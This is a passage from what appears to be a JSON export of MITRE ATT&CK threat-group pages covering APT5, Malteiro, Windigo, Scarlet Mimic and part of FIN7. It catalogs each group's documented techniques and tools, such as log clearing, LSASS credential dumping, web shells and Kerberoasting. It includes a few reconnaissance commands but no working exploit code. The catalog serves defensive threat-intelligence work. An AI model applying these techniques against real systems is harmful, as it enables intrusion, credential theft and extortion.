BLOODMINE utility to discover files with .css, .jpg, .png, .gif, .ico, .js, and .jsp extensions in Pulse Secure Connect logs.[4] Enterprise T1562 .006 Impair Defenses: Indicator Blocking APT5 has used the CLEANPULSE utility to insert command line strings into a targeted process to prevent certain log events from occurring.[4] Enterprise T1070 Indicator Removal APT5 has used the THINBLOOD utility to clear SSL VPN log files located at /home/runtime/logs.[3][4] .003 Clear Command History APT5 has cleared the command history on targeted ESXi servers.[4] .004 File Deletion APT5 has deleted scripts and web shells to evade detection.[3][4] .006 Timestomp APT5 has modified file timestamps.[4] Enterprise T1056 .001 Input Capture: Keylogging APT5 has used malware with keylogging capabilities to monitor the communications of targeted entities.[5][6] Enterprise T1654 Log Enumeration APT5 has used the BLOODMINE utility to parse and extract information from Pulse Secure Connect logs.[4] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location APT5 has named exfiltration archives to mimic Windows Updates at times using filenames with a KB<digits>.zip pattern.[4] Enterprise T1588 .002 Obtain Capabilities: Tool SPACEHOP Activity leverages a C2 framework sourced from a publicly-available Github repository for administration of relay nodes.[9] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory APT5 has used the Task Manager process to target LSASS process memory in order to obtain NTLM password hashes. APT5 has also dumped clear text passwords and hashes from memory using Mimikatz hosted through an RDP mapped drive.[4] .002 OS Credential Dumping: Security Account Manager APT5 has copied and exfiltrated the SAM Registry hive from targeted systems.[4] Enterprise T1057 Process Discovery APT5 has used Windows-based utilities to carry out tasks including tasklist.exe. [4] Enterprise T1055 Process Injection APT5 has used the CLEANPULSE utility to insert command line strings into a targeted process to alter its functionality.[4] Enterprise T1090 .003 Proxy: Multi-hop Proxy SPACEHOP Activity has routed traffic through chains of compromised network devices to proxy C2 communications.[9] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol APT5 has moved laterally throughout victim environments using RDP.[4] .004 Remote Services: SSH APT5 has used SSH for lateral movement in compromised environments including for enabling access to ESXi host servers.[4] Enterprise T1053 .003 Scheduled Task/Job: Cron APT5 has made modifications to the crontab file including in /var/cron/tabs/.[1] Enterprise T1505 .003 Server Software Component: Web Shell APT5 has installed multiple web shells on compromised servers including on Pulse Secure VPN appliances.[3][4] Enterprise T1049 System Network Connections Discovery APT5 has used the BLOODMINE utility to collect data on web requests from Pulse Secure Connect logs.[4] Enterprise T1078 .002 Valid Accounts: Domain Accounts APT5 has used legitimate account credentials to move laterally through compromised environments.[3] .004 Valid Accounts: Cloud Accounts APT5 has accessed Microsoft M365 cloud environments using stolen credentials. [4] Software ID Name References Techniques S0032 gh0st RAT [8] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S0002 Mimikatz [4] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [4] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0104 netstat [4] System Network Connections Discovery S1109 PACEMAKER [3] Automated Collection, Command and Scripting Interpreter: Unix Shell, Data Staged: Local Data Staging, File and Directory Discovery, OS Credential Dumping: Proc Filesystem, Process Injection: Ptrace System Calls S1050 PcShare [8] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Deobfuscate/Decode Files or Information, Event Triggered Execution: Component Object Model Hijacking, Exfiltration Over C2 Channel, Indicator Removal: File Deletion, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Invalid Code Signature, Modify Registry, Native API, Obfuscated Files or Information: Compression, Obfuscated Files or Information: Encrypted/Encoded File, Process Discovery, Process Injection, Query Registry, Screen Capture, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, Video Capture S0012 PoisonIvy [6] Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Active Setup, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data from Local System, Data Staged: Local Data Staging, Encrypted Channel: Symmetric Cryptography, Execution Guardrails: Mutual Exclusion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection: Dynamic-link Library Injection, Rootkit S1108 PULSECHECK [3] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Unix Shell, Data Encoding: Standard Encoding, Server Software Component: Web Shell S1113 RAPIDPULSE [4] Data from Local System, Deobfuscate/Decode Files or Information, Obfuscated Files or Information: Encrypted/Encoded File, Server Software Component: Web Shell S0007 Skeleton Key [8] Modify Authentication Process: Domain Controller Authentication S1110 SLIGHTPULSE [3][4] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter, Data Encoding: Standard Encoding, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Server Software Component: Web Shell S1104 SLOWPULSE [3] Compromise Host Software Binary, Data Staged: Local Data Staging, Modify Authentication Process: Network Device Authentication, Modify Authentication Process: Multi-Factor Authentication, Multi-Factor Authentication Interception, Obfuscated Files or Information S0057 Tasklist [4] Process Discovery, Software Discovery: Security Software Discovery, System Service Discovery References National Security Agency. (2022, December). APT5: Citrix ADC Threat Hunting Guidance. Retrieved February 5, 2024. Microsoft Threat Intelligence. (2023, September). Digital threats from East Asia increase in breadth and effectiveness. Retrieved February 5, 2024. Perez, D. et al. (2021, April 20). Check Your Pulse: Suspected APT Actors Leverage Authentication Bypass Techniques and Pulse Secure Zero-Day. Retrieved February 5, 2024. Perez, D. et al. (2021, May 27). Re-Checking Your Pulse: Updates on Chinese APT Actors Compromising Pulse Secure VPN Devices. Retrieved February 5, 2024. FireEye. (2015, March). SOUTHEAST ASIA: AN EVOLVING CYBER THREAT LANDSCAPE. Retrieved February 5, 2024. Mandiant. (n.d.). Advanced Persistent Threats (APTs). Retrieved February 14, 2024. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Secureworks CTU. (n.d.). BRONZE FLEETWOOD. Retrieved February 5, 2024. Raggi, Michael. (2024, May 22). IOC Extinction? China-Nexus Cyber Espionage Actors Use ORB Networks to Raise Cost on Defenders. Retrieved July 8, 2024. "
},
{
"id": 143,
"title": "Malteiro, Group G1026",
"path": "/groups/G1026/index.html",
"content": " Malteiro Malteiro is a financially motivated criminal group that is likely based in Brazil and has been active since at least November 2019. The group operates and distributes the Mispadu banking trojan via a Malware-as-a-Service (MaaS) business model. Malteiro mainly targets victims throughout Latin America (particularly Mexico) and Europe (particularly Spain and Portugal).[1] ID: G1026 Contributors: Daniel Fernando Soriano Espinosa; SCILabs Version: 1.0 Created: 13 March 2024 Last Modified: 29 March 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .005 Command and Scripting Interpreter: Visual Basic Malteiro has utilized a dropper containing malicious VBS scripts.[1] Enterprise T1555 Credentials from Password Stores Malteiro has obtained credentials from mail clients via NirSoft MailPassView.[1] .003 Credentials from Web Browsers Malteiro has stolen credentials stored in the victim\u2019s browsers via software tool NirSoft WebBrowserPassView.[1] Enterprise T1140 Deobfuscate/Decode Files or Information Malteiro has the ability to deobfuscate downloaded files prior to execution.[1] Enterprise T1657 Financial Theft Malteiro targets organizations in a wide variety of sectors via the use of Mispadu banking trojan with the goal of financial theft.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Malteiro has used scripts encoded in Base64 certificates to distribute malware to victims.[2] Enterprise T1566 .001 Phishing: Spearphishing Attachment Malteiro has sent spearphishing emails containing malicious .zip files.[1] Enterprise T1055 .001 Process Injection: Dynamic-link Library Injection Malteiro has injected Mispadu\u2019s DLL into a process.[1] Enterprise T1518 .001 Software Discovery: Security Software Discovery Malteiro collects the installed antivirus on the victim machine.[1] Enterprise T1082 System Information Discovery Malteiro collects the machine information, system architecture, the OS version, computer name, and Windows product name.[1] Enterprise T1614 .001 System Location Discovery: System Language Discovery Malteiro will terminate Mispadu's infection process if the language of the victim machine is not Spanish or Portuguese.[1] Enterprise T1204 .002 User Execution: Malicious File Malteiro has relied on users to execute .zip file attachments containing malicious URLs.[1] Software ID Name References Techniques S1122 Mispadu [1] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: Visual Basic, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Input Capture: Keylogging, Input Capture: GUI Input Capture, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Phishing: Spearphishing Link, Process Discovery, Process Injection, Screen Capture, Software Discovery: Security Software Discovery, Software Extensions: Browser Extensions, System Binary Proxy Execution: Msiexec, System Binary Proxy Execution: Rundll32, System Information Discovery, System Location Discovery: System Language Discovery, User Execution: Malicious File, Virtualization/Sandbox Evasion: System Checks References SCILabs. (2021, December 23). Cyber Threat Profile Malteiro. Retrieved March 13, 2024. SCILabs. (2023, October 8). URSA/Mispadu: Overlap analysis with other threats. Retrieved March 13, 2024. "
},
{
"id": 144,
"title": "Windigo, Group G0124",
"path": "/groups/G0124/index.html",
"content": " Windigo The Windigo group has been operating since at least 2011, compromising thousands of Linux and Unix servers using the Ebury SSH backdoor to create a spam botnet. Despite law enforcement intervention against the creators, Windigo operators continued updating Ebury through 2019.[1][2] ID: G0124 Version: 1.0 Created: 10 February 2021 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 Command and Scripting Interpreter Windigo has used a Perl script for information gathering.[3] Enterprise T1005 Data from Local System Windigo has used a script to gather credentials in files left on disk by OpenSSH backdoors.[3] Enterprise T1189 Drive-by Compromise Windigo has distributed Windows malware via drive-by downloads.[1] Enterprise T1083 File and Directory Discovery Windigo has used a script to check for the presence of files created by OpenSSH backdoors.[3] Enterprise T1090 Proxy Windigo has delivered a generic Windows proxy Win32/Glubteta.M. Windigo has also used multiple reverse proxy chains as part of their C2 infrastructure.[1] Enterprise T1518 Software Discovery Windigo has used a script to detect installed software on targeted systems.[3] Enterprise T1082 System Information Discovery Windigo has used a script to detect which Linux distribution and version is currently installed on the system.[3] Software ID Name References Techniques S0377 Ebury [4] Application Layer Protocol: DNS, Automated Exfiltration, Command and Scripting Interpreter: Unix Shell, Command and Scripting Interpreter: Python, Compromise Host Software Binary, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Fallback Channels, Hijack Execution Flow: Dynamic Linker Hijacking, Impair Defenses: Disable or Modify Tools, Impair Defenses: Disable or Modify Linux Audit System, Impair Defenses: Indicator Blocking, Modify Authentication Process: Pluggable Authentication Modules, Modify Authentication Process, Obfuscated Files or Information, Rootkit, Shared Modules, Subvert Trust Controls: Code Signing, Unsecured Credentials: Private Keys References Bilodeau, O., Bureau, M., Calvet, J., Dorais-Joncas, A., L\u00e9veill\u00e9, M., Vanheuverzwijn, B. (2014, March 18). Operation Windigo \u2013 the vivisection of a large Linux server\u2011side credential\u2011stealing malware campaign. Retrieved February 10, 2021. CERN. (2019, June 4). 2019/06/04 Advisory: Windigo attacks. Retrieved February 10, 2021. Dumont, R., M.L\u00e9veill\u00e9, M., Porcher, H. (2018, December 1). THE DARK SIDE OF THE FORSSHE A landscape of OpenSSH backdoors. Retrieved July 16, 2020. Vachon, F. (2017, October 30). Windigo Still not Windigone: An Ebury Update . Retrieved February 10, 2021. "
},
{
"id": 145,
"title": "Scarlet Mimic, Group G0029",
"path": "/groups/G0029/index.html",
"content": " Scarlet Mimic Scarlet Mimic is a threat group that has targeted minority rights activists. This group has not been directly linked to a government source, but the group's motivations appear to overlap with those of the Chinese government. While there is some overlap between IP addresses used by Scarlet Mimic and Putter Panda, it has not been concluded that the groups are the same. [1] ID: G0029 Version: 1.2 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1036 .002 Masquerading: Right-to-Left Override Scarlet Mimic has used the left-to-right override character in self-extracting RAR archive spearphishing attachment file names.[1] Software ID Name References Techniques S0077 CallMe [1] Command and Scripting Interpreter: Unix Shell, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, Ingress Tool Transfer S0076 FakeM [1] Data Obfuscation: Protocol or Service Impersonation, Encrypted Channel: Symmetric Cryptography, Input Capture: Keylogging, Non-Application Layer Protocol S0079 MobileOrder [1] Browser Information Discovery, Data from Local System, Exfiltration Over C2 Channel, File and Directory Discovery, Ingress Tool Transfer, Process Discovery, System Information Discovery S0078 Psylo [1] Application Layer Protocol: Web Protocols, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer References Falcone, R. and Miller-Osborn, J.. (2016, January 24). Scarlet Mimic: Years-Long Espionage Campaign Targets Minority Activists. Retrieved February 10, 2016. "
},
{
"id": 146,
"title": "FIN7, GOLD NIAGARA, ITG14, Carbon Spider, ELBRUS, Sangria Tempest, Group G0046",
"path": "/groups/G0046/index.html",
"content": " FIN7 FIN7 is a financially-motivated threat group that has been active since 2013. FIN7 has primarily targeted the retail, restaurant, hospitality, software, consulting, financial services, medical equipment, cloud services, media, food and beverage, transportation, and utilities industries in the U.S. A portion of FIN7 was run out of a front company called Combi Security and often used point-of-sale malware for targeting efforts. Since 2020, FIN7 shifted operations to a big game hunting (BGH) approach including use of REvil ransomware and their own Ransomware as a Service (RaaS), Darkside. FIN7 may be linked to the Carbanak Group, but there appears to be several groups using Carbanak malware and are therefore tracked separately.[1][2][3][4][5][6] ID: G0046 \u24d8 Associated Groups: GOLD NIAGARA, ITG14, Carbon Spider, ELBRUS, Sangria Tempest Contributors: Edward Millington Version: 4.0 Created: 31 May 2017 Last Modified: 17 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description GOLD NIAGARA [7] ITG14 ITG14 shares campaign overlap with FIN7.[8] Carbon Spider [5] ELBRUS [9] Sangria Tempest [10] Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains FIN7 has registered look-alike domains for use in phishing campaigns.[11] .006 Acquire Infrastructure: Web Services FIN7 has set up Amazon S3 buckets to host trojanized digital products.[6] Enterprise T1071 .004 Application Layer Protocol: DNS FIN7 has performed C2 using DNS via A, OPT, and TXT records.[4] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder FIN7 malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.[2][4] Enterprise T1059 Command and Scripting Interpreter FIN7 used SQL scripts to help perform tasks on the victim's machine.[4][12][4] .001 PowerShell FIN7 used a PowerShell script to launch shellcode that retrieved an additional payload.[2][13][14][6] .003 Windows Command Shell FIN7 used the command prompt to launch commands on the victim\u2019s machine.[4][12][6] .005 Visual Basic FIN7 used VBS scripts to help perform tasks on the victim's machine.[4][12][5] .007 JavaScript FIN7 used JavaScript scripts to help perform tasks on the victim's machine.[4][12][4] Enterprise T1543 .003 Create or Modify System Process: Windows Service FIN7 created new Windows services and added them to the startup directories for persistence.[4] Enterprise T1486 Data Encrypted for Impact FIN7 has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware.[5][6] Enterprise T1005 Data from Local System FIN7 has collected files and other sensitive information from a compromised network.[5] Enterprise T1587 .001 Develop Capabilities: Malware FIN7 has developed malware for use in operations, including the creation of infected removable media.[14][15] Enterprise T1546 .011 Event Triggered Execution: Application Shimming FIN7 has used application shim databases for persistence.[16] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage FIN7 has exfiltrated stolen data to the MEGA file sharing site.[5] Enterprise T1190 Exploit Public-Facing Application FIN7 has compromised targeted organizations through exploitation of CVE-2021-31207 in Exchange.[9] Enterprise T1210 Exploitation of Remote Services FIN7 has exploited ZeroLogon (CVE-2020-1472) against vulnerable domain controllers.[5] Enterprise T1008 Fallback Channels FIN7's Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails.[17] Enterprise T1105 Ingress Tool Transfer FIN7 has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.[2][18][6] Enterprise T1674 Input Injection FIN7 has used malicious USBs to emulate keystrokes to launch PowerShell to download and execute malware from the adversary's server.[14] Enterprise T1559 .002 Inter-Process Communication: Dynamic Data Exchange FIN7 spear phishing campaigns have included malicious Word documents with DDE execution.[19] Enterprise T1036 .004 Masquerading: Masquerade Task or Service FIN7 has created a scheduled task named \"AdobeFlashSync\" to establish persistence.[13] .005 Masquerading: Match Legitimate Resource Name or Location FIN7 has attempted to run Darkside ransomware with the filename sleep.exe.[5] Enterprise T1571 Non-Standard Port FIN7 has used port-protocol mismatches on ports such as 53, 80, 443, and 8080 during C2.[4] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation FIN7 has used fragmented strings, environment variables, standard input (stdin), and native character-replacement functionalities to obfuscate commands.[20][4][5] .016 Obfuscated Files or Information: Junk Code Insertion FIN7 has used random junk code to obfuscate malware code.[6] Enterprise T1588 .002 Obtain Capabilities: Tool FIN7 has utilized a variety of tools such as Cobalt Strike, PowerSploit, and the remote management tool, Atera for targeting efforts.[6] Enterprise T1069 .002 Permission Groups Discovery: Domain Groups FIN7 has used the command net group \"domain admins\" /domain to enumerate domain groups.[6] Enterprise T1566 .001 Phishing: Spearphishing Attachment FIN7 sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.[2][18][12][11][5] .002 Phishing: Spearphishing Link FIN7 has conducted broad phishing campaigns using malicious links.[5] Enterprise T1219 Remote Access Tools FIN7 has utilized the remote management tool Atera to download malware to a compromised system.[6] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol FIN7 has used RDP to move laterally in victim environments.[5] .004 Remote Services: SSH FIN7 has used SSH to move laterally through victim environments.[5] .005 Remote Services: VNC FIN7 has used TightVNC to control compromised hosts.[5] Enterprise T1091 Replication Through Removable Media FIN7 actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations.[14] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task FIN7 malware has created scheduled tasks to establish persistence.[2][13][4][12] Enterprise T1113 Screen Capture FIN7 captured screenshots and desktop video recordings.[18] Enterprise T1608 .001 Stage Capabilities: Upload Malware FIN7 has staged legitimate software, that was trojanized to contain an Atera agent installer, on Amazon S3.[6] .004 Stage Capabilities: Drive-by Target FIN7 has compromised a digital product website and modified multiple download links to point to trojanized versions of offered digital products.[6] Enterprise T1558 .003 Steal or Forge Kerberos Tickets: Kerberoasting FIN7 has used Kerberoasting PowerShell commands such as, Invoke-Kerberoast for credential access and to enable lateral movement.[5][6] Enterprise T1553 .002 Subvert Trust Controls: Code Signing FIN7 has signed Carbanak payloads with legally purchased code signing certificates. FIN7 has also digitally signed their phishing documents, backdoors and other staging tools to bypass security controls.[3][4] Enterprise T1195 .002 Supply Chain Compromise: Compromise Software Supply Chain FIN7 has gained initial access by compromising a victim's software supply chain.[6] Enterprise T1218 .005 System Binary Proxy Execution: Mshta FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.[2] .011 System Binary Proxy Execution: Rundll32 FIN7 has used rundll32.exe to execute malware on a compromised network.[6] Enterprise T1033 System Owner/User Discovery FIN7 has used the command cmd.exe /C quser to collect user session information.[6] Enterprise T1204 .001 User Execution: Malicious Link FIN7 has used malicious links to lure victims into downloading malware.[5] .002 User Execution: Malicious File FIN7 lured victims to double-click on images in the attachments they sent which would then execute the hidden LNK file.[2][11][5] Enterprise T1078 Valid Accounts FIN7 has harvested valid administrative credentials for lateral movement.[5] .003 Local Accounts FIN7 has used compromised credentials for access as SYSTEM on Exchange servers.[9] Enterprise T1125 Video Capture FIN7 created a custom video recording capability that could be used to monitor operations in the victim's environment.[4][18] Enterprise T1497 .002 Virtualization/Sandbox Evasion: User Activity Based Checks FIN7 used images embedded into document lures that only activate the payload when a user double clicks to avoid sandboxes.[2] Enterprise T1102 .002 Web Service: Bidirectional Communication FIN7 used legitimate services like Google Docs, Google Scripts, and Pastebin for C2.[4] Enterprise T1047 Windows Management Instrumentation FIN7 has used WMI to install malware on targeted systems.[11] Software ID Name References Techniques S0552 AdFind [5] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, System Network Configuration Discovery S0415 BOOSTWRITE [15] Deobfuscate/Decode Files or Information, Hijack Execution Flow: DLL, Obfuscated Files or Information: Encrypted/Encoded File, Shared Modules, Subvert Trust Controls: Code Signing S0030 Carbanak [1][4][18][8][5][14][6] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create Account: Local Account, Data Encoding: Standard Encoding, Data Transfer Size Limits, Email Collection: Local Email Collection, Encrypted Channel: Symmetric Cryptography, Indicator Removal: File Deletion, Input Capture: Keylogging, Obfuscated Files or Information, OS Credential Dumping, Process Discovery, Process Injection: Portable Executable Injection, Query Registry, Remote Access Tools, Remote Services: Remote Desktop Protocol, Screen Capture S0154 Cobalt Strike [5][14][6] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0488 CrackMapExec [5] Account Discovery: Domain Account, Brute Force: Password Spraying, Brute Force: Password Guessing, Brute Force, Command and Scripting Interpreter: PowerShell, File and Directory Discovery, Modify Registry, Network Share Discovery, OS Credential Dumping: Security Account Manager, OS Credential Dumping: NTDS, OS Credential Dumping: LSA Secrets, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Remote System Discovery, Scheduled Task/Job: At, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, Use Alternate Authentication Material: Pass the Hash, Windows Management Instrumentation S0417 GRIFFON [21][5][14][9] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: PowerShell, Permission Groups Discovery: Domain Groups, Scheduled Task/Job: Scheduled Task, Screen Capture, System Information Discovery, System Time Discovery S0151 HALFBAKED [2][4] Command and Scripting Interpreter: PowerShell, Indicator Removal: File Deletion, Process Discovery, Screen Capture, System Information Discovery, Windows Management Instrumentation S0648 JSS Loader [5][9] Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: PowerShell, Ingress Tool Transfer, Phishing: Spearphishing Attachment, Scheduled Task/Job: Scheduled Task, User Execution: Malicious File S0681 Lizar [22][23] Account Discovery: Email Account, Archive Collected Data, Browser Information Discovery, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Credentials from Password Stores: Windows Credential Manager, Credentials from Password Stores: Credentials from Web Browsers, Deobfuscate/Decode Files or Information, Encrypted Channel, Ingress Tool Transfer, Native API, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Process Injection: Portable Executable Injection, Screen Capture, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery S0449 Maze [9] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Data Encrypted for Impact, Dynamic Resolution, Hide Artifacts: Run Virtual Instance, Impair Defenses: Disable or Modify Tools, Indicator Removal, Inhibit System Recovery, Masquerading: Masquerade Task or Service, Native API, Obfuscated Files or Information: Junk Code Insertion, Obfuscated Files or Information, Process Discovery, Process Injection: Dynamic-link Library Injection, Scheduled Task/Job: Scheduled Task, Service Stop, System Binary Proxy Execution: Msiexec, System Information Discovery, System Location Discovery: System Language Discovery, System Network Connections Discovery, System Shutdown/Reboot, Windows Management Instrumentation S0002 Mimikatz [5] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0517 Pillowmint [24][5] Archive Collected Data, Command and Scripting Interpreter: PowerShell, Data from Local System, Deobfuscate/Decode Files or Information, Event Triggered Execution: Application Shimming, Indicator Removal: Clear Persistence, Indicator Removal: File Deletion, Modify Registry, Native API, Obfuscated Files or Information, Obfuscated Files or Information: Compression, Obfuscated Files or Information: Fileless Storage, Process Discovery, Process Injection: Asynchronous Procedure Call, Query Registry S0145 POWERSOURCE [1] Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Hide Artifacts: NTFS File Attributes, Ingress Tool Transfer, Query Registry S0194 PowerSploit [5][6] Access Token Manipulation, Account Discovery: Local Account, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Security Support Provider, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Domain Trust Discovery, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: DLL, Hijack Execution Flow: Path Interception by Search Order Hijacking, Input Capture: Keylogging, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Reflective Code Loading, Scheduled Task/Job: Scheduled Task, Screen Capture, Steal or Forge Kerberos Tickets: Kerberoasting, Unsecured Credentials: Credentials in Registry, Unsecured Credentials: Group Policy Preferences, Windows Management Instrumentation S0416 RDFSNIFFER [15] Indicator Removal: File Deletion, Input Capture: Credential API Hooking, Native API S0496 REvil [8][5][14][9] Access Token Manipulation: Create Process with Token, Access Token Manipulation: Token Impersonation/Theft, Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Data Destruction, Data Encrypted for 